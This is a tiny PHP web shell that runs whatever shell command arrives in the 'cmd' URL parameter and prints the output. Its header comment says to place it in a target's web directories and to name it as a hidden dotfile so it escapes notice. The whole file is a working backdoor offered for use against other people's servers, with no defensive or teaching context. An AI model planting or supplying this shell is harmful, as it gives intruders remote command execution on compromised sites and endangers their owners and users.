<?php
	/**************************************************
	* Place in target's web directories for a good time.
	* Proip: name as .shell_exec.php or whatever to sorta
	* hide it.
	**************************************************/
	
	$cmd = $_GET['cmd'];
	$out = shell_exec($cmd);
	echo "<pre>$out</pre>"
?>